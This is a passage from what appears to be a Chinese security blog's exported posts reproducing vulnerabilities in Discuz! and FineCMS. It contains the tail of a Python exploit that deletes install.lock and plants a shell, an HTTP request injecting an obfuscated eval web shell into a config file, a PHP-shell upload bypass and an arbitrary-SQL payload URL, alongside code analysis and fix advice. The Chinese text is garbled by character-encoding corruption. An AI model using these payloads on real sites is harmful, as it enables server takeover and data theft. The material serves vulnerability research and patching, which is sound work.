    print(&#39;password: &#123;&#125;&#39;.format(shell_password))


if __name__ == &#39;__main__&#39;:
    login()
    form_hash = get_form_hash()
    if form_hash:
        delete(form_hash, &#39;../../../data/install.lock&#39;)
        getshell()
    else:
        print(&#39;failed&#39;)</code></pre>
<h2 id="Dzå…¨ç‰ˆæœ¬ï¼Œç‰ˆæœ¬è½¬æ¢åŠŸèƒ½å¯¼è‡´Getshell"><a href="#Dzå…¨ç‰ˆæœ¬ï¼Œç‰ˆæœ¬è½¬æ¢åŠŸèƒ½å¯¼è‡´Getshell" class="headerlink" title="Dzå…¨ç‰ˆæœ¬ï¼Œç‰ˆæœ¬è½¬æ¢åŠŸèƒ½å¯¼è‡´Getshell"></a>Dzå…¨ç‰ˆæœ¬ï¼Œç‰ˆæœ¬è½¬æ¢åŠŸèƒ½å¯¼è‡´Getshell</h2><h3 id="1ã€ç®€è¿°-3"><a href="#1ã€ç®€è¿°-3" class="headerlink" title="1ã€ç®€è¿°"></a>1ã€ç®€è¿°</h3><p>å­˜åœ¨é—®é¢˜çš„ä»£ç åœ¨<code>/utility/convert/</code>ç›®å½•ä¸‹ï¼Œè¿™éƒ¨åˆ†çš„åŠŸèƒ½ä¸»è¦æ˜¯ç”¨äºDzç³»åˆ—äº§å“å‡çº§/è½¬æ¢ã€‚</p>
<p><strong>å½±å“èŒƒå›´ï¼š</strong>å…¨ç‰ˆæœ¬</p>
<p><strong>æ¡ä»¶ï¼š</strong>å­˜åœ¨<code>/utility/convert/</code>ç›®å½•å’Œç›¸åº”åŠŸèƒ½ã€‚</p>
<h3 id="2ã€å¤ç°ç¯å¢ƒ-3"><a href="#2ã€å¤ç°ç¯å¢ƒ-3" class="headerlink" title="2ã€å¤ç°ç¯å¢ƒ"></a>2ã€å¤ç°ç¯å¢ƒ</h3><p>åŒä¸Šï¼Œç›®å‰giteeæœ€æ–°ç‰ˆä»£ç ä¾ç„¶å­˜åœ¨è¯¥æ¼æ´ã€‚</p>
<h3 id="3ã€æ¼æ´å¤ç°-3"><a href="#3ã€æ¼æ´å¤ç°-3" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>åœ¨äº§å“å‡çº§/è½¬æ¢-&gt;é€‰æ‹©äº§å“è½¬æ¢ç¨‹åº -&gt;è®¾ç½®æœåŠ¡å™¨ä¿¡æ¯ è¿™é‡ŒæŠ“åŒ…ï¼Œ</p>
<p>payloadï¼š</p>
<pre><code>POST /dz/utility/convert/index.php HTTP/1.1
Host: 127.0.0.1:8001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 278
Origin: http://127.0.0.1:8001
Connection: close
Referer: http://127.0.0.1:8001/dz/utility/convert/index.php
Upgrade-Insecure-Requests: 1

a=config&amp;source=d7.2_x1.5&amp;submit=yes&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_utility/4_1.png"></p>
<h3 id="4ã€æ¼æ´åˆ†æ-3"><a href="#4ã€æ¼æ´åˆ†æ-3" class="headerlink" title="4ã€æ¼æ´åˆ†æ"></a>4ã€æ¼æ´åˆ†æ</h3><p>å…¥å£<code>utility/convert/index.php</code></p>
<pre><code class="php">require &#39;./include/common.inc.php&#39;;

$action = getgpc(&#39;a&#39;);
$action = empty($action) ? getgpc(&#39;action&#39;) : $action;
$source = getgpc(&#39;source&#39;) ? getgpc(&#39;source&#39;) : getgpc(&#39;s&#39;);</code></pre>
<p> å–<code>$_POST[&#39;a&#39;]</code>,ç›´æ¥èµ‹å€¼ç»™<code>$action </code>ï¼Œæ­¤æ—¶<code>$action = config</code>;</p>
<pre><code class="php">&#125; elseif($action == &#39;config&#39; || CONFIG_EMPTY) &#123;      
    require DISCUZ_ROOT.&#39;./include/do_config.inc.php&#39;;  
&#125; elseif($action == &#39;setting&#39;) &#123;</code></pre>
<p>æ»¡è¶³æ¡ä»¶ï¼Œå¼•å…¥<code>./include/do_config.inc.php</code></p>
<pre><code class="php">@touch($configfile);
 ......
if(submitcheck()) &#123;
    $newconfig = getgpc(&#39;newconfig&#39;);
    if(is_array($newconfig)) &#123;
        $checkarray = $setting[&#39;config&#39;][&#39;ucenter&#39;] ? array(&#39;source&#39;, &#39;target&#39;, &#39;ucenter&#39;) : array(&#39;source&#39;, &#39;target&#39;);
        foreach ($checkarray as $key) &#123;
      ......
    &#125;
    save_config_file($configfile, $newconfig, $config_default);</code></pre>
<p><code>$newconfig</code>ä»<code>$_POST[newconfig]</code>è·å–æ•°æ®ï¼Œ<code>save_config_file</code>å‡½æ•°ä¿å°†<code>$newconfig</code>ä¿å­˜åˆ°<code>$configfile</code>æ–‡ä»¶ä¸­ï¼Œå³<code>config.inc.php</code>æ–‡ä»¶ã€‚è·Ÿè¿›è¯¥å‡½æ•°ã€‚</p>
<pre><code class="php">function save_config_file($filename, $config, $default) &#123;
    $config = setdefault($config, $default);// å°†$configä¸­çš„ç©ºç™½é¡¹ç”¨ $default ä¸­å¯¹åº”é¡¹çš„å€¼å¡«å……
    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
    $year = date(&#39;Y&#39;);
    $content = &lt;&lt;&lt;EOT
&lt;?php


\$_config = array();

EOT;
    $content .= getvars(array(&#39;_config&#39; =&gt; $config));
    $content .= &quot;\r\n// &quot;.str_pad(&#39;  THE END  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH).&quot; //\r\n\r\n?&gt;&quot;;
    file_put_contents($filename, $content);
&#125;</code></pre>
<p>getvarså‡½æ•°å¤„ç†ï¼Œæ­¤æ—¶çš„<code>$config</code> = <code>$newconfig+config.default.phpå¯¹åº”é¡¹çš„è¡¥å……</code>ã€‚çœ‹ä¸€ä¸‹getvarså‡½æ•°ï¼š</p>
<pre><code class="php">function getvars($data, $type = &#39;VAR&#39;) &#123;
    $evaluate = &#39;&#39;;
    foreach($data as $key =&gt; $val) &#123;
        if(!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $key)) &#123;
            continue;
        &#125;
        if(is_array($val)) &#123;
            $evaluate .= buildarray($val, 0, &quot;\$&#123;$key&#125;&quot;).&quot;\r\n&quot;;
        &#125; else &#123;
            $val = addcslashes($val, &#39;\&#39;\\&#39;);
            $evaluate .= $type == &#39;VAR&#39; ? &quot;\$$key = &#39;$val&#39;;\n&quot; : &quot;define(&#39;&quot;.strtoupper($key).&quot;&#39;, &#39;$val&#39;);\n&quot;;
        &#125;
    &#125;
    return $evaluate;
&#125;</code></pre>
<p>æ»¡è¶³ifæ¡ä»¶ä¼šæ‰§è¡Œ<code>buildarray</code>å‡½æ•°ï¼Œæ­¤æ—¶<code>$key=_config</code>ï¼Œ<code>$val</code>=ä¸Šé¢çš„<code>$config</code>ã€‚æœ€ç»ˆé€ æˆå†™å…¥çš„åœ¨è¯¥å‡½æ•°ä¸­ï¼ˆupdate.php 2206è¡Œï¼‰ï¼š</p>
<pre><code class="php">    foreach ($array as $key =&gt; $val) &#123;
        if($level == 0) &#123;
            //str_pad â€” ä½¿ç”¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²å¡«å……å­—ç¬¦ä¸²ä¸ºæŒ‡å®šé•¿åº¦
            // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šé•¿åº¦ä¸º50ï¼Œç”¨&#39;-&#39;å¡«å……ï¼Œå±…ä¸­
            $newline = str_pad(&#39;  CONFIG &#39;.strtoupper($key).&#39;  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH);
            $return .= &quot;\r\n// $newline //\r\n&quot;;
        &#125;</code></pre>
<p>æœ¬æ„æ˜¯ä½¿ç”¨<code>$config</code>æ•°ç»„çš„keyä½œä¸ºæ¯ä¸€å—é…ç½®åŒºåŸŸçš„â€æ³¨é‡Šæ ‡é¢˜â€ï¼Œå†™å…¥é…ç½®æ–‡ä»¶çš„$newlineä¾èµ–äº$keyï¼Œè€Œ$keyæ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚</p>
<p>æœªå¯¹è¾“å…¥æ•°æ®è¿›è¡Œæ­£ç¡®çš„è¾¹ç•Œå¤„ç†ï¼Œå¯¼è‡´å¯ä»¥æ’å…¥æ¢è¡Œç¬¦ï¼Œé€ƒç¦»æ³¨é‡Šçš„ä½œç”¨èŒƒå›´ï¼Œä»è€Œä½¿è¾“å…¥æ•°æ®è½¬åŒ–ä¸ºå¯æ‰§è¡Œä»£ç ã€‚</p>
<h3 id="5ã€ä¿®å¤å»ºè®®"><a href="#5ã€ä¿®å¤å»ºè®®" class="headerlink" title="5ã€ä¿®å¤å»ºè®®"></a>5ã€ä¿®å¤å»ºè®®</h3><p>update.php 2206è¡Œ</p>
<pre><code class="php">  foreach ($array as $key =&gt; $val)&#123; 
    //è¿‡æ»¤æ‰$keyä¸­çš„éå­—æ¯ã€æ•°å­—åŠä¸‹åˆ’çº¿å­—ç¬¦</code></pre>
<h2 id="å…¨ç‰ˆæœ¬åå°Sqlæ³¨å…¥"><a href="#å…¨ç‰ˆæœ¬åå°Sqlæ³¨å…¥" class="headerlink" title="å…¨ç‰ˆæœ¬åå°Sqlæ³¨å…¥"></a>å…¨ç‰ˆæœ¬åå°Sqlæ³¨å…¥</h2><h3 id="1ã€ç®€è¿°-4"><a href="#1ã€ç®€è¿°-4" class="headerlink" title="1ã€ç®€è¿°"></a>1ã€ç®€è¿°</h3><p>Discuz! Xç³»åˆ—å…¨ç‰ˆæœ¬ æˆªæ­¢åˆ° Discuz! X3.4 R20191201 UTF-8</p>
<p><strong>äºŒæ¬¡æ³¨å…¥</strong></p>
<p>åˆ©ç”¨æ¡ä»¶æœ‰é™ï¼Œè¿˜æ˜¯æŒºé¸¡è‚‹çš„ã€‚</p>
<h3 id="2ã€å¤ç°ç¯å¢ƒ-4"><a href="#2ã€å¤ç°ç¯å¢ƒ-4" class="headerlink" title="2ã€å¤ç°ç¯å¢ƒ"></a>2ã€å¤ç°ç¯å¢ƒ</h3><p>åŒä¸Š</p>
<h3 id="3ã€æ¼æ´å¤ç°-4"><a href="#3ã€æ¼æ´å¤ç°-4" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_3.png"></p>
<p>æŠ¥é”™æ³¨å…¥ï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_1.png"></p>
<p>å†™æ–‡ä»¶ï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_2.png"></p>
<h3 id="4ã€æ¼æ´åˆ†æ-4"><a href="#4ã€æ¼æ´åˆ†æ-4" class="headerlink" title="4ã€æ¼æ´åˆ†æ"></a>4ã€æ¼æ´åˆ†æ</h3><p>æ¼æ´åŸå› ï¼šç»è¿‡addslasheså­˜å…¥æ–‡ä»¶ä¸­,ä»æ–‡ä»¶ä¸­å–å‡ºå­—ç¬¦,è½¬ä¹‰ç¬¦å·ä¸¢å¤±ï¼Œé€ æˆäºŒæ¬¡æ³¨å…¥</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_sqli/5_4.png"></p>
<p>ç”±å‰å‡ ä¸ªçš„åˆ†æå·²ç»æ˜ç™½äº†dzçš„è·¯ç”±å½¢å¼ï¼Œæ­¤å¤„çš„è·¯ç”±è§£æå¦‚ä¸‹ï¼š<code>?action=xxx =&gt; ../admincp_xxx.php</code></p>
<p>è·Ÿè¿›<code>source/admincp/admincp_setting.php</code>ï¼Œ2566è¡Œï¼Œæ¥æ”¶å‚æ•°ä¿®æ”¹<code>UC_APPID</code>å€¼ã€‚</p>
<pre><code class="php">        $configfile = str_replace(&quot;define(&#39;UC_APPID&#39;, &#39;&quot;.addslashes(UC_APPID).&quot;&#39;)&quot;, &quot;define(&#39;UC_APPID&#39;, &#39;&quot;.$settingnew[&#39;uc&#39;][&#39;appid&#39;].&quot;&#39;)&quot;, $configfile);

        $fp = fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;);
        if(!($fp = @fopen(&#39;./config/config_ucenter.php&#39;, &#39;w&#39;))) &#123;
            cpmsg(&#39;uc_config_write_error&#39;, &#39;&#39;, &#39;error&#39;);
        &#125;
        @fwrite($fp, trim($configfile));
        @fclose($fp);</code></pre>
<p>æˆåŠŸå†™å…¥æ¶æ„<code>UC_APPID</code>åï¼Œæ‰§è¡Œæ›´æ–°è¯»å–æ–°çš„é…ç½®ä¿¡æ¯ï¼Œ3415è¡Œï¼š</p>
<pre><code class="php">    if($updatecache) &#123;

        updatecache(&#39;setting&#39;);</code></pre>
<p>æœ€ååœ¨<code>uc_client/model/base.php</code>çš„<code>note_exists</code>æ–¹æ³•ä¸­è§¦å‘æ³¨å…¥</p>
<pre><code class="php">    function note_exists() &#123;
        $noteexists = $this-&gt;db-&gt;result_first(&quot;SELECT value FROM &quot;.UC_DBTABLEPRE.&quot;vars WHERE name=&#39;noteexists&quot;.UC_APPID.&quot;&#39;&quot;);
        if(empty($noteexists)) &#123;
            return FALSE;
        &#125; else &#123;
            return TRUE;
        &#125;
    &#125;</code></pre>
<h2 id="Discuz-ML-V3-X-ä»£ç æ³¨å…¥æ¼æ´"><a href="#Discuz-ML-V3-X-ä»£ç æ³¨å…¥æ¼æ´" class="headerlink" title="Discuz ML! V3.X ä»£ç æ³¨å…¥æ¼æ´"></a>Discuz ML! V3.X ä»£ç æ³¨å…¥æ¼æ´</h2><h3 id="1ã€ç®€è¿°-5"><a href="#1ã€ç®€è¿°-5" class="headerlink" title="1ã€ç®€è¿°"></a>1ã€ç®€è¿°</h3><p><strong>æ¼æ´ç¼–å·ï¼š</strong>CVE-2019-13956</p>
<p><strong>æˆå› ï¼š</strong>æ¼æ´æ˜¯ç”±äºDiscuz! MLå¯¹äºcookieå­—æ®µçš„ä¸æ°å½“å¤„ç†é€ æˆçš„ï¼Œcookieå­—æ®µä¸­çš„languageå‚æ•°æœªç»è¿‡æ»¤ï¼Œç›´æ¥è¢«æ‹¼æ¥å†™å…¥ç¼“å­˜æ–‡ä»¶ä¹‹ä¸­ï¼Œè€Œç¼“å­˜æ–‡ä»¶éšååˆè¢«åŠ è½½ï¼Œä»è€Œé€ æˆä»£ç æ‰§è¡Œ</p>
<h3 id="2ã€å¤ç°ç¯å¢ƒ-5"><a href="#2ã€å¤ç°ç¯å¢ƒ-5" class="headerlink" title="2ã€å¤ç°ç¯å¢ƒ"></a>2ã€å¤ç°ç¯å¢ƒ</h3>]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>Finecms V5.0.9ä»»æ„æ–‡ä»¶ä¸Šä¼ &amp;ä»»æ„ä»£ç æ‰§è¡Œ&amp;ä»»æ„SQLè¯­å¥æ‰§è¡Œ</title>
    <url>/2018/01/24/finecms-v5.0.9-ren-yi-wen-jian-shang-chuan-ren-yi-dai-ma-zhi-xing-ren-yi-sql-yu-ju-zhi-xing/</url>
    <content><![CDATA[<h1 id="0X01-ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#0X01-ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0X01 ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>0X01 ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1><p>â€‹    æ¼æ´å­˜åœ¨äºä¼šå‘˜çš„ä¿®æ”¹ä¸Šä¼ å¤´åƒé¡µé¢(xxxxx/index.php?s=member&amp;c=account&amp;m=avatar)</p>
<h2 id="æ¼æ´å®ç°"><a href="#æ¼æ´å®ç°" class="headerlink" title="æ¼æ´å®ç°"></a>æ¼æ´å®ç°</h2><p>å¯¹ä¸Šä¼ çš„å¤´åƒè¿›è¡ŒburpæŠ“åŒ…ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/202341938.png" alt="mark"></p>
<p>â€‹    è¿™é‡Œå°†txå‚æ•°å†…å®¹é‡Œçš„jpegæ”¹ä¸ºphpï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œå®é™…ä¸ŠæˆåŠŸä¸Šä¼ äº†ä¸ªphpæ–‡ä»¶ã€‚</p>
<p>â€‹    è·¯å¾„å¯ä»¥é€šè¿‡å®¡æŸ¥å…ƒç´ æ‰¾åˆ°å¤´åƒå›¾ç‰‡çš„è·¯å¾„å’Œæ ¼å¼ã€‚</p>
<p>â€‹    <img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/202714351.png" alt="mark"></p>
<p>â€‹    æ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼Œä¸”ä¸Šä¼ çš„ä¸€å¥è¯å¯æ­£å¸¸æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/202810399.png" alt="mark"></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é—®é¢˜å‡ºåœ¨<code>finecms/dayrui/controllers/member/Account.php</code>çš„ç¬¬177è¡Œå¼€å§‹çš„uploadå‡½æ•°ã€‚</p>
<pre><code class="php">   public function upload() &#123;

        // åˆ›å»ºå›¾ç‰‡å­˜å‚¨æ–‡ä»¶å¤¹
        $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;;
        @dr_dir_delete($dir);
        !is_dir($dir) &amp;&amp; dr_mkdirs($dir);

        if ($_POST[&#39;tx&#39;]) &#123;
            $file = str_replace(&#39; &#39;, &#39;+&#39;, $_POST[&#39;tx&#39;]);
            if (preg_match(&#39;/^(data:\s*image\/(\w+);base64,)/&#39;, $file, $result))&#123;
                $new_file = $dir.&#39;0x0.&#39;.$result[2];
                if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &#39;&#39;, $file)))) &#123;
                    exit(dr_json(0, &#39;ç›®å½•æƒé™ä¸è¶³æˆ–ç£ç›˜å·²æ»¡&#39;));
                &#125; else &#123;
                    $this-&gt;load-&gt;library(&#39;image_lib&#39;);
                    $config[&#39;create_thumb&#39;] = TRUE;
                    $config[&#39;thumb_marker&#39;] = &#39;&#39;;
                    $config[&#39;maintain_ratio&#39;] = FALSE;
                    $config[&#39;source_image&#39;] = $new_file;
                    foreach (array(30, 45, 90, 180) as $a) &#123;
                        $config[&#39;width&#39;] = $config[&#39;height&#39;] = $a;
                        $config[&#39;new_image&#39;] = $dir.$a.&#39;x&#39;.$a.&#39;.&#39;.$result[2];
                        $this-&gt;image_lib-&gt;initialize($config);
                        if (!$this-&gt;image_lib-&gt;resize()) &#123;
                            exit(dr_json(0, &#39;ä¸Šä¼ é”™è¯¯ï¼š&#39;.$this-&gt;image_lib-&gt;display_errors()));
                            break;
                        &#125;
                    &#125;
                    list($width, $height, $type, $attr) = getimagesize($dir.&#39;45x45.&#39;.$result[2]);
                    !$type &amp;&amp; exit(dr_json(0, &#39;å›¾ç‰‡å­—ç¬¦ä¸²ä¸è§„èŒƒ&#39;));
                &#125;
            &#125; else &#123;

                exit(dr_json(0, &#39;å›¾ç‰‡å­—ç¬¦ä¸²ä¸è§„èŒƒ&#39;));
            &#125;
        &#125; else &#123;
            exit(dr_json(0, &#39;å›¾ç‰‡ä¸å­˜åœ¨&#39;));
        &#125;

// ä¸Šä¼ å›¾ç‰‡åˆ°æœåŠ¡å™¨
        if (defined(&#39;UCSSO_API&#39;)) &#123;
            $rt = ucsso_avatar($this-&gt;uid, file_get_contents($dir.&#39;90x90.jpg&#39;));
            !$rt[&#39;code&#39;] &amp;&amp; $this-&gt;_json(0, fc_lang(&#39;é€šä¿¡å¤±è´¥ï¼š%s&#39;, $rt[&#39;msg&#39;]));
        &#125;


        exit(&#39;1&#39;);
    &#125;

&#125;</code></pre>
<p><code>    $dir = SYS_UPLOAD_PATH.&#39;/member/&#39;.$this-&gt;uid.&#39;/&#39;;</code>ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œåœ¨memberåæ‹¼æ¥äº†$uidä½¿æ¯ä¸€ä¸ªç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ç‹¬ç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œuidåœ¨cookieä¸­ï¼Œä¸Šæ–‡burpæŠ“åˆ°çš„åŒ…ä¸­å¯ä»¥çœ‹åˆ°ã€‚</p>
<p>â€‹    è¿™é‡Œå¯¹ä¼ è¿›æ¥çš„txå‚æ•°æœ‰ä¸ªæ­£åˆ™åŒ¹é…æ¥è·å–æ–‡ä»¶æ‰©å±•åå’Œæ–‡ä»¶å†…å®¹ã€‚</p>
<p>â€‹    é—®é¢˜å°±å‡ºåœ¨ç¬¬186è¡Œè¿™ä¸ªæ­£åˆ™ä¸Š:<code>/^(data:\s*image\/(\w+);base64,)/</code>ã€‚</p>
<p>â€‹    å®ƒä¼šåŒ¹é…data:å¼€å¤´ï¼Œä¸­é—´å¸¦æœ‰image/ï¼Œbase64,ç»“å°¾çš„ä¸€æ®µå­—ç¬¦ä¸²ã€‚å…³é”®åœ¨<code>(\w+)</code>è¿™ä¸ªæ­£åˆ™ï¼Œå®ƒä¼šåŒ¹é…image/åbase64å‰çš„å†…å®¹ï¼Œä½œä¸ºnewfileçš„æ–‡ä»¶åç¼€åã€‚<code>$new_file = $dir.&#39;0x0.&#39;.$result[2];</code>,è¿™é‡Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å¯¼è‡´äº†å¯ä»¥ä¸Šä¼ ä»»ä½•ç±»å‹çš„æ–‡ä»¶ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/233714211.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20180123/233724241.png" alt="mark"></p>
<h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>å¯¹åŒ¹é…åˆ°çš„æ–‡ä»¶æ‰©å±•åè¿›è¡Œè¿‡æ»¤ã€‚åªå…è®¸ç‰¹å®šå›¾ç‰‡ç±»å‹ã€‚</p>
<h1 id="0X02-ä»»æ„SQLè¯­å¥æ‰§è¡Œ"><a href="#0X02-ä»»æ„SQLè¯­å¥æ‰§è¡Œ" class="headerlink" title="0X02 ä»»æ„SQLè¯­å¥æ‰§è¡Œ"></a>0X02 ä»»æ„SQLè¯­å¥æ‰§è¡Œ</h1><h2 id="æ¼æ´å®ç°-1"><a href="#æ¼æ´å®ç°-1" class="headerlink" title="æ¼æ´å®ç°"></a>æ¼æ´å®ç°</h2><p>â€‹    payloadï¼š</p>
<pre><code>/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=action=sql sql=&#39;select user();&#39;</code></pre>
<p>â€‹    authçš„å€¼ä¸ºæ­¤cookienameéƒ¨åˆ†å€¼çš„md5å€¼ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/183650354.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/212038658.png" alt="mark"></p>
<h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>â€‹    <code>/finecms/dayrui/config/config.php</code>ä¸­çš„ç¬¬37è¡Œå¯¹cookie_nameè¿›è¡Œäº†å®šä¹‰ã€‚</p>
<pre><code>$config[&#39;sess_cookie_name&#39;]                = $site[&#39;SYS_KEY&#39;].&#39;_ci_session&#39;;</code></pre>
<p>â€‹    è¿™é‡Œ$site[â€˜SYS_KEYâ€™]ä¸å°±æŠŠSYS_KEYçš„å€¼ç»™æš´éœ²äº†ã€‚</p>
<p>â€‹    è¿™ä¸ªSYS_KEYæ˜¯å®‰å…¨ç ï¼Œæœ‰äº†å®ƒå°±èƒ½è¿›è¡Œæ¥ä¸‹æ¥çš„æ•æ„Ÿå‡½æ•°çš„è°ƒç”¨ã€‚</p>
<p>â€‹    <code>/finecms/dayrui/controllers/Api.php</code>ä¸­çš„115-166è¡Œçš„data2()å‡½æ•°ã€‚</p>
<pre><code class="php">public function data2() &#123;

        $data = array();

        // å®‰å…¨ç è®¤è¯
        $auth = $this-&gt;input-&gt;get(&#39;auth&#39;, true);
        if ($auth != md5(SYS_KEY)) &#123;
            // æˆæƒè®¤è¯ç ä¸æ­£ç¡®
            $data = array(&#39;msg&#39; =&gt; &#39;æˆæƒè®¤è¯ç ä¸æ­£ç¡®&#39;, &#39;code&#39; =&gt; 0);
        &#125; else &#123;
            // è§£ææ•°æ®
            $cache = &#39;&#39;;
            $param = $this-&gt;input-&gt;get(&#39;param&#39;);
            if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;
                $cache = md5(dr_array2string($param));
                $data = $this-&gt;get_cache_data($cache);
            &#125;
            if (!$data) &#123;

                // listæ•°æ®æŸ¥è¯¢
                $data = $this-&gt;template-&gt;list_tag($param);
                $data[&#39;code&#39;] = $data[&#39;error&#39;] ? 0 : 1;
                unset($data[&#39;sql&#39;], $data[&#39;pages&#39;]);

                // ç¼“å­˜æ•°æ®
                $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&#39;cache&#39;]);
            &#125;
        &#125;

        // æ¥æ”¶å‚æ•°
        $format = $this-&gt;input-&gt;get(&#39;format&#39;);
        $function = $this-&gt;input-&gt;get(&#39;function&#39;);
        if ($function) &#123;
            if (!function_exists($function)) &#123;
                $data = array(&#39;msg&#39; =&gt; fc_lang(&#39;è‡ªå®šä¹‰å‡½æ•°&#39;.$function.&#39;ä¸å­˜åœ¨&#39;), &#39;code&#39; =&gt; 0);
            &#125; else &#123;
                $data = $function($data);
            &#125;
        &#125;

        // é¡µé¢è¾“å‡º
        if ($format == &#39;php&#39;) &#123;
            print_r($data);
        &#125; elseif ($format == &#39;jsonp&#39;) &#123;
            // è‡ªå®šä¹‰è¿”å›åç§°
            echo $this-&gt;input-&gt;get(&#39;callback&#39;, TRUE).&#39;(&#39;.$this-&gt;callback_json($data).&#39;)&#39;;
        &#125; else &#123;
            // è‡ªå®šä¹‰è¿”å›åç§°
            echo $this-&gt;callback_json($data);
        &#125;
        exit;
    &#125;</code></pre>
<p>â€‹    å¯ä»¥çœ‹åˆ°å¼€å§‹æœ‰ä¸ªå®‰å…¨ç çš„éªŒè¯ï¼Œæœ‰äº†ä¹‹å‰å¾—åˆ°çš„å®‰å…¨ç ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°äº†.</p>
<p>â€‹    <code>if ($auth != md5(SYS_KEY)) &#123;</code>å°†authå€¼ä¸SYS_KEYçš„md5å€¼è¿›è¡Œæ¯”å¯¹ï¼ŒåŒåˆ™ç»§ç»­ï¼Œå¼‚åˆ™å¤±è´¥ã€‚</p>
<p>â€‹    127è¡Œè·å¾—è¾“å…¥paramå‚æ•°å€¼ã€‚</p>
<pre><code class="php">$param = $this-&gt;input-&gt;get(&#39;param&#39;);</code></pre>
<p>â€‹    ä¸æ»¡è¶³128è¡Œçš„ifæ¡ä»¶ï¼Œå¾—ä»¥ç»§ç»­æ‰§è¡Œã€‚</p>
<pre><code class="php"> if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;</code></pre>
<p>â€‹    135è¡Œé€ æˆäº†æ¼æ´ã€‚</p>
<pre><code class="php">$data = $this-&gt;template-&gt;list_tag($param);</code></pre>
<p>â€‹    å®šä½list_tag()å‡½æ•°çœ‹çœ‹ã€‚</p>
<p>â€‹    <code>/finecms/dayrui/libraries/Template.php</code>ç¬¬402-1314æ˜¯list_tagå‡½æ•°ã€‚</p>
